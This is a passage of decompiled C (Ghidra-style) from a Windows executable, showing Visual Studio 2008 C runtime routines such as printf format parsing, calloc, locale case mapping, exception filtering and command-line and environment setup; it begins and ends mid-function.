          if (*pbVar9 == 0) goto switchD_004125ed_caseD_9;
        }
        _write_char(local_264);
        break;
      case 1:
        local_21c = (int *)0xffffffff;
        local_270 = 0;
        local_25c = 0;
        local_238 = (int *)0x0;
        local_234 = 0;
        local_214 = 0;
        local_23c = 0;
        break;
      case 2:
        if (local_215 == 0x20) {
          local_214 = local_214 | 2;
        }
        else if (local_215 == 0x23) {
          local_214 = local_214 | 0x80;
        }
        else if (local_215 == 0x2b) {
          local_214 = local_214 | 1;
        }
        else if (local_215 == 0x2d) {
          local_214 = local_214 | 4;
        }
        else if (local_215 == 0x30) {
          local_214 = local_214 | 8;
        }
        break;
      case 3:
        if (local_215 == 0x2a) {
          local_228 = (int **)((int)_ArgList + 4);
          local_238 = *(int **)_ArgList;
          if ((int)local_238 < 0) {
            local_214 = local_214 | 4;
            local_238 = (int *)-(int)local_238;
          }
        }
        else {
          local_238 = (int *)((int)local_238 * 10 + -0x30 + (int)(char)local_215);
        }
        break;
      case 4:
        local_21c = (int *)0x0;
        break;
      case 5:
        if (local_215 == 0x2a) {
          local_228 = (int **)((int)_ArgList + 4);
          local_21c = *(int **)_ArgList;
          if ((int)local_21c < 0) {
            local_21c = (int *)0xffffffff;
          }
        }
        else {
          local_21c = (int *)((int)local_21c * 10 + -0x30 + (int)(char)local_215);
        }
        break;
      case 6:
        if (local_215 == 0x49) {
          bVar1 = *pbVar9;
          if ((bVar1 == 0x36) && (((byte *)_Format)[2] == 0x34)) {
            local_214 = local_214 | 0x8000;
            local_240 = (byte *)_Format + 3;
          }
          else if ((bVar1 == 0x33) && (((byte *)_Format)[2] == 0x32)) {
            local_214 = local_214 & 0xffff7fff;
            local_240 = (byte *)_Format + 3;
          }
          else if (((((bVar1 != 100) && (bVar1 != 0x69)) && (bVar1 != 0x6f)) &&
                   ((bVar1 != 0x75 && (bVar1 != 0x78)))) && (bVar1 != 0x58)) {
            local_244 = 0;
            goto switchD_004125ed_caseD_0;
          }
        }
        else if (local_215 == 0x68) {
          local_214 = local_214 | 0x20;
        }
        else if (local_215 == 0x6c) {
          if (*pbVar9 == 0x6c) {
            local_214 = local_214 | 0x1000;
            local_240 = (byte *)_Format + 2;
          }
          else {
            local_214 = local_214 | 0x10;
          }
        }
        else if (local_215 == 0x77) {
          local_214 = local_214 | 0x800;
        }
        break;
      case 7:
        if ((char)local_215 < 'e') {
          if (local_215 == 100) {
LAB_00412ad9:
            local_214 = local_214 | 0x40;
LAB_00412ae0:
            local_224 = (int *)0xa;
LAB_00412aea:
            if (((local_214 & 0x8000) == 0) && ((local_214 & 0x1000) == 0)) {
              local_228 = (int **)((int)_ArgList + 4);
              if ((local_214 & 0x20) == 0) {
                piVar3 = *(int **)_ArgList;
                if ((local_214 & 0x40) == 0) {
                  piVar11 = (int *)0x0;
                }
                else {
                  piVar11 = (int *)((int)piVar3 >> 0x1f);
                }
              }
              else {
                if ((local_214 & 0x40) == 0) {
                  piVar3 = (int *)(uint)*(ushort *)_ArgList;
                }
                else {
                  piVar3 = (int *)(int)*(short *)_ArgList;
                }
                piVar11 = (int *)((int)piVar3 >> 0x1f);
              }
            }
            else {
              local_228 = (int **)((int)_ArgList + 8);
              piVar3 = *(int **)_ArgList;
              piVar11 = *(int **)((int)_ArgList + 4);
            }
            if ((((local_214 & 0x40) != 0) && ((int)piVar11 < 1)) && ((int)piVar11 < 0)) {
              bVar12 = piVar3 != (int *)0x0;
              piVar3 = (int *)-(int)piVar3;
              piVar11 = (int *)-(int)((int)piVar11 + (uint)bVar12);
              local_214 = local_214 | 0x100;
            }
            uVar13 = CONCAT44(piVar11,piVar3);
            if ((local_214 & 0x9000) == 0) {
              piVar11 = (int *)0x0;
            }
            if ((int)local_21c < 0) {
              local_21c = (int *)0x1;
            }
            else {
              local_214 = local_214 & 0xfffffff7;
              if (0x200 < (int)local_21c) {
                local_21c = (int *)0x200;
              }
            }
            if (((uint)piVar3 | (uint)piVar11) == 0) {
              local_234 = 0;
            }
            piVar3 = (int *)local_11;
            while( true ) {
              piVar15 = piVar11;
              piVar11 = (int *)((int)local_21c + -1);
              if (((int)local_21c < 1) && (((uint)uVar13 | (uint)piVar15) == 0)) break;
              local_21c = piVar11;
              uVar13 = __aulldvrm((uint)uVar13,(uint)piVar15,(uint)local_224,(int)local_224 >> 0x1f)
              ;
              iVar7 = extraout_ECX + 0x30;
              if (0x39 < iVar7) {
                iVar7 = iVar7 + local_260;
              }
              *(char *)piVar3 = (char)iVar7;
              piVar3 = (int *)((int)piVar3 + -1);
              piVar11 = (int *)((ulonglong)uVar13 >> 0x20);
              local_268 = piVar15;
            }
            local_224 = (int *)(local_11 + -(int)piVar3);
            local_220 = (int *)((int)piVar3 + 1);
            local_21c = piVar11;
            if (((local_214 & 0x200) != 0) &&
               ((local_224 == (int *)0x0 || (*(char *)local_220 != '0')))) {
              *(char *)piVar3 = '0';
              local_224 = (int *)(local_11 + -(int)piVar3 + 1);
              local_220 = piVar3;
            }
          }
          else if ((char)local_215 < 'T') {
            if (local_215 == 0x53) {
              if ((local_214 & 0x830) == 0) {
                local_214 = local_214 | 0x800;
              }
              goto LAB_00412908;
            }
            if (local_215 == 0x41) {
LAB_00412886:
              local_215 = local_215 + 0x20;
              local_270 = 1;
LAB_00412899:
              local_214 = local_214 | 0x40;
              local_268 = (int *)0x200;
              piVar3 = local_210;
              piVar11 = local_268;
              piVar15 = local_210;
              if ((int)local_21c < 0) {
                local_21c = (int *)0x6;
              }
              else if (local_21c == (int *)0x0) {
                if (local_215 == 0x67) {
                  local_21c = (int *)0x1;
                }
              }
              else {
                if (0x200 < (int)local_21c) {
                  local_21c = (int *)0x200;
                }
                if (0xa3 < (int)local_21c) {
                  piVar11 = (int *)((int)local_21c + 0x15d);
                  local_220 = local_210;
                  local_258 = (int *)__malloc_crt((size_t)piVar11);
                  piVar3 = local_258;
                  piVar15 = local_258;
                  if (local_258 == (int *)0x0) {
                    local_21c = (int *)0xa3;
                    piVar3 = local_210;
                    piVar11 = local_268;
                    piVar15 = local_220;
                  }
                }
              }
              local_220 = piVar15;
              local_268 = piVar11;
              local_228 = (int **)((int)_ArgList + 8);
              local_27c = *(int **)_ArgList;
              local_278 = *(int **)((int)_ArgList + 4);
              plVar18 = &local_254;
              iVar7 = (int)(char)local_215;
              ppiVar14 = &local_27c;
              piVar11 = piVar3;
              piVar15 = local_268;
              piVar16 = local_21c;
              uVar17 = local_270;
              pcVar5 = (code *)__decode_pointer((int)PTR_LAB_00422de8);
              (*pcVar5)(ppiVar14,piVar11,piVar15,iVar7,piVar16,uVar17,plVar18);
              uVar4 = local_214 & 0x80;
              if ((uVar4 != 0) && (local_21c == (int *)0x0)) {
                plVar18 = &local_254;
                piVar11 = piVar3;
                pcVar5 = (code *)__decode_pointer((int)PTR_LAB_00422df4);
                (*pcVar5)(piVar11,plVar18);
              }
              if ((local_215 == 0x67) && (uVar4 == 0)) {
                plVar18 = &local_254;
                piVar11 = piVar3;
                pcVar5 = (code *)__decode_pointer((int)PTR_LAB_00422df0);
                (*pcVar5)(piVar11,plVar18);
              }
              if (*(char *)piVar3 == '-') {
                local_214 = local_214 | 0x100;
                piVar3 = (int *)((int)piVar3 + 1);
                local_220 = piVar3;
              }
LAB_00412a3b:
              local_224 = (int *)_strlen((char *)piVar3);
            }
            else if (local_215 == 0x43) {
              if ((local_214 & 0x830) == 0) {
                local_214 = local_214 | 0x800;
              }
LAB_0041297b:
              local_228 = (int **)((int)_ArgList + 4);
              if ((local_214 & 0x810) == 0) {
                local_210[0]._0_1_ = *_ArgList;
                local_224 = (int *)0x1;
              }
              else {
                eVar6 = _wctomb_s((int *)&local_224,(char *)local_210,0x200,*(wchar_t *)_ArgList);
                if (eVar6 != 0) {
                  local_25c = 1;
                }
              }
              local_220 = local_210;
            }
            else if ((local_215 == 0x45) || (local_215 == 0x47)) goto LAB_00412886;
          }
          else {
            if (local_215 == 0x58) goto LAB_00412c3c;
            if (local_215 == 0x5a) {
              piVar3 = *(int **)_ArgList;
              local_228 = (int **)((int)_ArgList + 4);
              if ((piVar3 == (int *)0x0) || (local_220 = (int *)piVar3[1], local_220 == (int *)0x0))
              {
                local_220 = (int *)PTR_DAT_00422da0;
                piVar3 = (int *)PTR_DAT_00422da0;
                goto LAB_00412a3b;
              }
              local_224 = (int *)(int)*(wchar_t *)piVar3;
              if ((local_214 & 0x800) == 0) {
                local_23c = 0;
              }
              else {
                local_224 = (int *)((int)local_224 / 2);
                local_23c = 1;
              }
            }
            else {
              if (local_215 == 0x61) goto LAB_00412899;
              if (local_215 == 99) goto LAB_0041297b;
            }
          }
LAB_00412e15:
          if (local_25c == 0) {
            if ((local_214 & 0x40) != 0) {
              if ((local_214 & 0x100) == 0) {
                if ((local_214 & 1) == 0) {
                  if ((local_214 & 2) == 0) goto LAB_00412e5e;
                  local_230 = 0x20;
                }
                else {
                  local_230 = 0x2b;
                }
              }
              else {
                local_230 = 0x2d;
              }
              local_234 = 1;
            }
LAB_00412e5e:
            pcVar10 = (char *)((int)local_238 + (-local_234 - (int)local_224));
            if ((local_214 & 0xc) == 0) {
              _write_multi_char(0x20,(int)pcVar10,local_264);
            }
            pFVar2 = local_264;
            _write_string(local_234);
            if (((local_214 & 8) != 0) && ((local_214 & 4) == 0)) {
              _write_multi_char(0x30,(int)pcVar10,pFVar2);
            }
            if ((local_23c == 0) || ((int)local_224 < 1)) {
              _write_string((int)local_224);
            }
            else {
              local_268 = local_224;
              piVar3 = local_220;
              do {
                _WCh = *(wchar_t *)piVar3;
                local_268 = (int *)((int)local_268 + -1);
                piVar3 = (int *)((int)piVar3 + 2);
                eVar6 = _wctomb_s(&local_274,local_11 + 1,6,_WCh);
                if ((eVar6 != 0) || (local_274 == 0)) {
                  local_22c = -1;
                  break;
                }
                _write_string(local_274);
              } while (local_268 != (int *)0x0);
            }
            if ((-1 < local_22c) && ((local_214 & 4) != 0)) {
              _write_multi_char(0x20,(int)pcVar10,pFVar2);
            }
          }
        }
        else {
          if ('p' < (char)local_215) {
            if (local_215 == 0x73) {
LAB_00412908:
              piVar3 = local_21c;
              if (local_21c == (int *)0xffffffff) {
                piVar3 = (int *)0x7fffffff;
              }
              local_228 = (int **)((int)_ArgList + 4);
              local_220 = *(int **)_ArgList;
              if ((local_214 & 0x810) == 0) {
                local_224 = local_220;
                if (local_220 == (int *)0x0) {
                  local_220 = (int *)PTR_DAT_00422da0;
                  local_224 = (int *)PTR_DAT_00422da0;
                }
                for (; (piVar3 != (int *)0x0 &&
                       (piVar3 = (int *)((int)piVar3 + -1), *(char *)local_224 != '\0'));
                    local_224 = (int *)((int)local_224 + 1)) {
                }
                local_224 = (int *)((int)local_224 - (int)local_220);
              }
              else {
                if (local_220 == (int *)0x0) {
                  local_220 = (int *)PTR_u__null__00422da4;
                }
                local_23c = 1;
                for (piVar11 = local_220;
                    (piVar3 != (int *)0x0 &&
                    (piVar3 = (int *)((int)piVar3 + -1), *(wchar_t *)piVar11 != L'\0'));
                    piVar11 = (int *)((int)piVar11 + 2)) {
                }
                local_224 = (int *)((int)piVar11 - (int)local_220 >> 1);
              }
              goto LAB_00412e15;
            }
            if (local_215 == 0x75) goto LAB_00412ae0;
            if (local_215 != 0x78) goto LAB_00412e15;
            local_260 = 0x27;
LAB_00412c68:
            local_224 = (int *)0x10;
            if ((local_214 & 0x80) != 0) {
              local_22f = (char)local_260 + 'Q';
              local_230 = 0x30;
              local_234 = 2;
            }
            goto LAB_00412aea;
          }
          if (local_215 == 0x70) {
            local_21c = (int *)0x8;
LAB_00412c3c:
            local_260 = 7;
            goto LAB_00412c68;
          }
          if ((char)local_215 < 'e') goto LAB_00412e15;
          if ((char)local_215 < 'h') goto LAB_00412899;
          if (local_215 == 0x69) goto LAB_00412ad9;
          if (local_215 != 0x6e) {
            if (local_215 != 0x6f) goto LAB_00412e15;
            local_224 = (int *)0x8;
            if ((local_214 & 0x80) != 0) {
              local_214 = local_214 | 0x200;
            }
            goto LAB_00412aea;
          }
          piVar3 = *(int **)_ArgList;
          local_228 = (int **)((int)_ArgList + 4);
          iVar7 = __get_printf_count_output();
          if (iVar7 == 0) goto switchD_004125ed_caseD_9;
          if ((local_214 & 0x20) == 0) {
            *piVar3 = local_22c;
          }
          else {
            *(wchar_t *)piVar3 = (wchar_t)local_22c;
          }
          local_25c = 1;
        }
        if (local_258 != (int *)0x0) {
          _free(local_258);
          local_258 = (int *)0x0;
        }
        break;
      default:
        goto switchD_004125ed_caseD_9;
      case 0xbad1abe1:
        break;
      }
      local_215 = *local_240;
      _Format = (char *)local_240;
      _ArgList = (va_list)local_228;
    } while (local_215 != 0);
    if ((local_244 == 0) || (local_244 == 7)) goto LAB_00412fe1;
    piVar3 = __errno();
    *piVar3 = 0x16;
  }
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  if (local_248 != '\0') {
    *(uint *)(local_24c + 0x70) = *(uint *)(local_24c + 0x70) & 0xfffffffd;
  }
LAB_00412ffa:
  iVar7 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return iVar7;
}



// Library Function - Single Match
//  ___crtLCMapStringW
// 
// Library: Visual Studio 2008 Release

int __cdecl
___crtLCMapStringW(LPCWSTR _LocaleName,DWORD _DWMapFlag,LPCWSTR _LpSrcStr,int _CchSrc,
                  LPWSTR _LpDestStr,int _CchDest)

{
  int iVar1;
  short *psVar2;
  LPWSTR pWVar3;
  int in_stack_0000001c;
  _LocaleUpdate local_14 [8];
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate(local_14,(localeinfo_struct *)_LocaleName);
  psVar2 = (short *)_CchSrc;
  pWVar3 = _LpDestStr;
  if (0 < (int)_LpDestStr) {
    do {
      pWVar3 = (LPWSTR)((int)pWVar3 + -1);
      if (*psVar2 == 0) goto LAB_0041305a;
      psVar2 = psVar2 + 1;
    } while (pWVar3 != (LPWSTR)0x0);
    pWVar3 = (LPWSTR)0xffffffff;
LAB_0041305a:
    _LpDestStr = (LPWSTR)((int)_LpDestStr + (-1 - (int)pWVar3));
  }
  iVar1 = LCMapStringW(_DWMapFlag,(DWORD)_LpSrcStr,(LPCWSTR)_CchSrc,(int)_LpDestStr,(LPWSTR)_CchDest
                       ,in_stack_0000001c);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return iVar1;
}



// WARNING: This is an inlined function
// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// Library Function - Single Match
//  __alloca_probe_16
// 
// Library: Visual Studio 2008 Release

uint __alloca_probe_16(undefined1 param_1)

{
  uint in_EAX;
  uint uVar1;
  
  uVar1 = 4 - in_EAX & 0xf;
  return in_EAX + uVar1 | -(uint)CARRY4(in_EAX,uVar1);
}



// WARNING: This is an inlined function
// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// Library Function - Single Match
//  __alloca_probe_8
// 
// Library: Visual Studio

uint __alloca_probe_8(undefined1 param_1)

{
  uint in_EAX;
  uint uVar1;
  
  uVar1 = 4 - in_EAX & 7;
  return in_EAX + uVar1 | -(uint)CARRY4(in_EAX,uVar1);
}



// Library Function - Single Match
//  __towlower_l
// 
// Library: Visual Studio 2008 Release

wint_t __cdecl __towlower_l(wint_t _C,_locale_t _Locale)

{
  wchar_t *_DWMapFlag;
  wint_t wVar1;
  int iVar2;
  undefined2 in_stack_00000006;
  localeinfo_struct local_18;
  int local_10;
  char local_c;
  ushort local_8 [2];
  
  wVar1 = 0xffff;
  if (_C != 0xffff) {
    _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_18,_Locale);
    _DWMapFlag = (local_18.locinfo)->lc_category[0].wlocale;
    if (_DWMapFlag == (wchar_t *)0x0) {
      wVar1 = _C;
      if ((ushort)(_C - 0x41) < 0x1a) {
        wVar1 = _C + 0x20;
      }
    }
    else if (_C < 0x100) {
      iVar2 = __iswctype_l(_C,1,&local_18);
      wVar1 = _C;
      if (iVar2 != 0) {
        wVar1 = (wint_t)*(byte *)((int)local_18.locinfo[1].lc_category[0].wlocale + (__C & 0xffff));
      }
    }
    else {
      iVar2 = ___crtLCMapStringW((LPCWSTR)&local_18,(DWORD)_DWMapFlag,(LPCWSTR)0x100,(int)&_C,
                                 (LPWSTR)0x1,(int)local_8);
      wVar1 = _C;
      if (iVar2 != 0) {
        wVar1 = local_8[0];
      }
    }
    if (local_c != '\0') {
      *(uint *)(local_10 + 0x70) = *(uint *)(local_10 + 0x70) & 0xfffffffd;
    }
  }
  return wVar1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __calloc_impl
// 
// Library: Visual Studio 2008 Release

int * __cdecl __calloc_impl(uint param_1,uint param_2,undefined4 *param_3)

{
  int *piVar1;
  int iVar2;
  uint *_Size;
  uint *dwBytes;
  
  if ((param_1 == 0) || (param_2 <= 0xffffffe0 / param_1)) {
    _Size = (uint *)(param_1 * param_2);
    dwBytes = _Size;
    if (_Size == (uint *)0x0) {
      dwBytes = (uint *)0x1;
    }
    do {
      piVar1 = (int *)0x0;
      if (dwBytes < (uint *)0xffffffe1) {
        if ((DAT_0042576c == 3) &&
           (dwBytes = (uint *)((int)dwBytes + 0xfU & 0xfffffff0), _Size <= DAT_00425778)) {
          __lock(4);
          piVar1 = ___sbh_alloc_block(_Size);
          FUN_0041326d();
          if (piVar1 != (int *)0x0) {
            _memset(piVar1,0,(size_t)_Size);
            goto LAB_00413222;
          }
        }
        else {
LAB_00413222:
          if (piVar1 != (int *)0x0) {
            return piVar1;
          }
        }
        piVar1 = (int *)HeapAlloc(DAT_00423e54,8,(SIZE_T)dwBytes);
      }
      if (piVar1 != (int *)0x0) {
        return piVar1;
      }
      if (DAT_004241a8 == 0) {
        if (param_3 == (undefined4 *)0x0) {
          return (int *)0x0;
        }
        *param_3 = 0xc;
        return (int *)0x0;
      }
      iVar2 = __callnewh((size_t)dwBytes);
    } while (iVar2 != 0);
    if (param_3 != (undefined4 *)0x0) {
      *param_3 = 0xc;
    }
  }
  else {
    piVar1 = __errno();
    *piVar1 = 0xc;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return (int *)0x0;
}



void FUN_0041326d(void)

{
  FUN_0040e2eb(4);
  return;
}



// Library Function - Single Match
//  long __stdcall __CxxUnhandledExceptionFilter(struct _EXCEPTION_POINTERS *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

long __CxxUnhandledExceptionFilter(_EXCEPTION_POINTERS *param_1)

{
  PEXCEPTION_RECORD pEVar1;
  ULONG_PTR UVar2;
  
  pEVar1 = param_1->ExceptionRecord;
  if (((pEVar1->ExceptionCode == 0xe06d7363) && (pEVar1->NumberParameters == 3)) &&
     ((UVar2 = pEVar1->ExceptionInformation[0], UVar2 == 0x19930520 ||
      (((UVar2 == 0x19930521 || (UVar2 == 0x19930522)) || (UVar2 == 0x1994000)))))) {
    terminate();
  }
  return 0;
}



// Library Function - Single Match
//  __XcptFilter
// 
// Library: Visual Studio 2008 Release

int __cdecl __XcptFilter(ulong _ExceptionNum,_EXCEPTION_POINTERS *_ExceptionPtr)

{
  ulong *puVar1;
  code *pcVar2;
  void *pvVar3;
  ulong uVar4;
  _ptiddata p_Var5;
  ulong *puVar6;
  int iVar7;
  int iVar8;
  
  p_Var5 = __getptd_noexit();
  if (p_Var5 != (_ptiddata)0x0) {
    puVar1 = (ulong *)p_Var5->_pxcptacttab;
    puVar6 = puVar1;
    do {
      if (*puVar6 == _ExceptionNum) break;
      puVar6 = puVar6 + 3;
    } while (puVar6 < puVar1 + DAT_00422dbc * 3);
    if ((puVar1 + DAT_00422dbc * 3 <= puVar6) || (*puVar6 != _ExceptionNum)) {
      puVar6 = (ulong *)0x0;
    }
    if ((puVar6 == (ulong *)0x0) || (pcVar2 = (code *)puVar6[2], pcVar2 == (code *)0x0)) {
      p_Var5 = (_ptiddata)0x0;
    }
    else if (pcVar2 == (code *)0x5) {
      puVar6[2] = 0;
      p_Var5 = (_ptiddata)0x1;
    }
    else {
      if (pcVar2 != (code *)0x1) {
        pvVar3 = p_Var5->_tpxcptinfoptrs;
        p_Var5->_tpxcptinfoptrs = _ExceptionPtr;
        if (puVar6[1] == 8) {
          if (DAT_00422db0 < DAT_00422db4 + DAT_00422db0) {
            iVar7 = DAT_00422db0 * 0xc;
            iVar8 = DAT_00422db0;
            do {
              *(undefined4 *)(iVar7 + 8 + (int)p_Var5->_pxcptacttab) = 0;
              iVar8 = iVar8 + 1;
              iVar7 = iVar7 + 0xc;
            } while (iVar8 < DAT_00422db4 + DAT_00422db0);
          }
          uVar4 = *puVar6;
          iVar8 = p_Var5->_tfpecode;
          if (uVar4 == 0xc000008e) {
            p_Var5->_tfpecode = 0x83;
          }
          else if (uVar4 == 0xc0000090) {
            p_Var5->_tfpecode = 0x81;
          }
          else if (uVar4 == 0xc0000091) {
            p_Var5->_tfpecode = 0x84;
          }
          else if (uVar4 == 0xc0000093) {
            p_Var5->_tfpecode = 0x85;
          }
          else if (uVar4 == 0xc000008d) {
            p_Var5->_tfpecode = 0x82;
          }
          else if (uVar4 == 0xc000008f) {
            p_Var5->_tfpecode = 0x86;
          }
          else if (uVar4 == 0xc0000092) {
            p_Var5->_tfpecode = 0x8a;
          }
          (*pcVar2)(8,p_Var5->_tfpecode);
          p_Var5->_tfpecode = iVar8;
        }
        else {
          puVar6[2] = 0;
          (*pcVar2)(puVar6[1]);
        }
        p_Var5->_tpxcptinfoptrs = pvVar3;
      }
      p_Var5 = (_ptiddata)0xffffffff;
    }
  }
  return (int)p_Var5;
}



// Library Function - Single Match
//  __wwincmdln
// 
// Library: Visual Studio 2008 Release

void __wwincmdln(void)

{
  ushort uVar1;
  bool bVar2;
  ushort *puVar3;
  
  bVar2 = false;
  puVar3 = DAT_004268c8;
  if (DAT_004268c8 == (ushort *)0x0) {
    puVar3 = &DAT_0041de30;
  }
  do {
    uVar1 = *puVar3;
    if (uVar1 < 0x21) {
      if (uVar1 == 0) {
        return;
      }
      if (!bVar2) {
        for (; (*puVar3 != 0 && (*puVar3 < 0x21)); puVar3 = puVar3 + 1) {
        }
        return;
      }
    }
    if (uVar1 == 0x22) {
      bVar2 = !bVar2;
    }
    puVar3 = puVar3 + 1;
  } while( true );
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __wsetenvp
// 
// Library: Visual Studio 2008 Release

int __cdecl __wsetenvp(void)

{
  int iVar1;
  wchar_t **ppwVar2;
  wchar_t *_Dst;
  errno_t eVar3;
  wchar_t *pwVar4;
  int iVar5;
  size_t _Count;
  
  iVar5 = 0;
  pwVar4 = DAT_004239b4;
  if (DAT_004239b4 == (wchar_t *)0x0) {
    iVar5 = -1;
  }
  else {
    for (; *pwVar4 != L'\0'; pwVar4 = pwVar4 + iVar1 + 1) {
      if (*pwVar4 != L'=') {
        iVar5 = iVar5 + 1;
      }
      iVar1 = FUN_00409dc5(pwVar4);
    }
    ppwVar2 = (wchar_t **)__calloc_crt(iVar5 + 1,4);
    pwVar4 = DAT_004239b4;
    DAT_00423e70 = ppwVar2;
    if (ppwVar2 == (wchar_t **)0x0) {
      iVar5 = -1;
    }
    else {
      for (; *pwVar4 != L'\0'; pwVar4 = pwVar4 + _Count) {
        iVar5 = FUN_00409dc5(pwVar4);
        _Count = iVar5 + 1;
        if (*pwVar4 != L'=') {
          _Dst = (wchar_t *)__calloc_crt(_Count,2);
          *ppwVar2 = _Dst;
          if (_Dst == (wchar_t *)0x0) {
            _free(DAT_00423e70);
            DAT_00423e70 = (wchar_t **)0x0;
            return -1;
          }
          eVar3 = _wcscpy_s(_Dst,_Count,pwVar4);
          if (eVar3 != 0) {
                    // WARNING: Subroutine does not return
            __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
          }
          ppwVar2 = ppwVar2 + 1;
        }
      }
      _free(DAT_004239b4);
      DAT_004239b4 = (wchar_t *)0x0;
      *ppwVar2 = (wchar_t *)0x0;
      _DAT_00425758 = 1;
      iVar5 = 0;
    }
  }
  return iVar5;
}



// Library Function - Single Match
//  _wparse_cmdline
// 
// Library: Visual Studio 2008 Release

void __thiscall _wparse_cmdline(void *this,short **param_1,int *param_2)

{
  bool bVar1;
  bool bVar2;
  short *in_EAX;
  short *psVar3;
  short sVar4;
  uint uVar5;
  int *unaff_EBX;
  
  bVar1 = false;
  *unaff_EBX = 0;
  *param_2 = 1;
  if (param_1 != (short **)0x0) {
    *param_1 = (short *)this;
    param_1 = param_1 + 1;
  }
  do {
    if (*in_EAX == 0x22) {
      bVar1 = !bVar1;
      sVar4 = 0x22;
    }
    else {
      *unaff_EBX = *unaff_EBX + 1;
      if ((short *)this != (short *)0x0) {
        *(short *)this = *in_EAX;
        this = (void *)((int)this + 2);
      }
      sVar4 = *in_EAX;
      if (sVar4 == 0) goto LAB_004135d3;
    }
    in_EAX = in_EAX + 1;
  } while ((bVar1) || ((sVar4 != 0x20 && (sVar4 != 9))));
  if ((short *)this != (short *)0x0) {
    *(short *)((int)this + -2) = 0;
  }
LAB_004135d3:
  bVar1 = false;
  while (psVar3 = in_EAX, *in_EAX != 0) {
    for (; (*psVar3 == 0x20 || (*psVar3 == 9)); psVar3 = psVar3 + 1) {
    }
    if (*psVar3 == 0) break;
    if (param_1 != (short **)0x0) {
      *param_1 = (short *)this;
      param_1 = param_1 + 1;
    }
    *param_2 = *param_2 + 1;
    while( true ) {
      bVar2 = true;
      uVar5 = 0;
      for (; *psVar3 == 0x5c; psVar3 = psVar3 + 1) {
        uVar5 = uVar5 + 1;
      }
      in_EAX = psVar3;
      if (*psVar3 == 0x22) {
        if (((uVar5 & 1) == 0) && ((!bVar1 || (in_EAX = psVar3 + 1, *in_EAX != 0x22)))) {
          bVar2 = false;
          bVar1 = !bVar1;
          in_EAX = psVar3;
        }
        uVar5 = uVar5 >> 1;
      }
      while (uVar5 != 0) {
        uVar5 = uVar5 - 1;
        if ((short *)this != (short *)0x0) {
          *(short *)this = 0x5c;
          this = (void *)((int)this + 2);
        }
        *unaff_EBX = *unaff_EBX + 1;
      }
      sVar4 = *in_EAX;
      if ((sVar4 == 0) || ((!bVar1 && ((sVar4 == 0x20 || (sVar4 == 9)))))) break;
      if (bVar2) {
        if ((short *)this != (short *)0x0) {
          *(short *)this = sVar4;
          this = (void *)((int)this + 2);
        }
        *unaff_EBX = *unaff_EBX + 1;
      }
      psVar3 = in_EAX + 1;
    }
    if ((short *)this != (short *)0x0) {
      *(short *)this = 0;
      this = (void *)((int)this + 2);
    }
    *unaff_EBX = *unaff_EBX + 1;
  }
  if (param_1 != (short **)0x0) {
    *param_1 = (short *)0x0;
  }
  *param_2 = *param_2 + 1;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __wsetargv
// 
// Library: Visual Studio 2008 Release

int __cdecl __wsetargv(void)

{
  uint _Size;
  uint uVar1;
  short **ppsVar2;
  int iVar3;
  uint in_ECX;
  uint local_8;
  
  _DAT_004243f8 = 0;
  local_8 = in_ECX;
  GetModuleFileNameW((HMODULE)0x0,(LPWSTR)&DAT_004241f0,0x104);
  _DAT_00423e7c = &DAT_004241f0;
  _wparse_cmdline((void *)0x0,(short **)0x0,(int *)&local_8);
  uVar1 = local_8;
  if ((((local_8 < 0x3fffffff) && (in_ECX < 0x7fffffff)) &&
      (_Size = (in_ECX + local_8 * 2) * 2, in_ECX * 2 <= _Size)) &&
     (ppsVar2 = (short **)__malloc_crt(_Size), ppsVar2 != (short **)0x0)) {
    _wparse_cmdline(ppsVar2 + uVar1,ppsVar2,(int *)&local_8);
    _DAT_00423e5c = local_8 - 1;
    iVar3 = 0;
    _DAT_00423e64 = ppsVar2;
  }
  else {
    iVar3 = -1;
  }
  return iVar3;
}



// Library Function - Single Match
//  ___crtGetEnvironmentStringsW
// 
// Library: Visual Studio 2008 Release

LPVOID __cdecl ___crtGetEnvironmentStringsW(void)

{
  WCHAR WVar1;
  LPWCH _Src;
  WCHAR *pWVar2;
  WCHAR *pWVar3;
  size_t _Size;
  void *_Dst;
  
  _Src = GetEnvironmentStringsW();
  if (_Src != (LPWCH)0x0) {
    WVar1 = *_Src;
    pWVar3 = _Src;
    while (WVar1 != L'\0') {
      do {
        pWVar2 = pWVar3;
        pWVar3 = pWVar2 + 1;
      } while (*pWVar3 != L'\0');
      pWVar3 = pWVar2 + 2;
      WVar1 = *pWVar3;
    }
    _Size = (int)pWVar3 + (2 - (int)_Src);
    _Dst = __malloc_crt(_Size);
    if (_Dst != (void *)0x0) {
      _memcpy(_Dst,_Src,_Size);
    }
    FreeEnvironmentStringsW(_Src);
    return _Dst;
  }
  return (LPVOID)0x0;
}



LPWSTR GetCommandLineW(void)

{
  LPWSTR pWVar1;
  
                    // WARNING: Could not recover jumptable at 0x004137b9. Too many branches
                    // WARNING: Treating indirect jump as call
  pWVar1 = GetCommandLineW();
  return pWVar1;
}



// WARNING: Removing unreachable block (ram,0x004137d3)
// WARNING: Removing unreachable block (ram,0x004137d9)
// WARNING: Removing unreachable block (ram,0x004137db)
// Library Function - Single Match
//  __RTC_Initialize
// 
// Library: Visual Studio 2008 Release

void __RTC_Initialize(void)

{
  return;
}



// Library Function - Single Match
//  ___security_init_cookie
// 
// Library: Visual Studio 2008 Release

void __cdecl ___security_init_cookie(void)

{
  DWORD DVar1;
  DWORD DVar2;
  DWORD DVar3;
  uint uVar4;
  LARGE_INTEGER local_14;
  _FILETIME local_c;
  
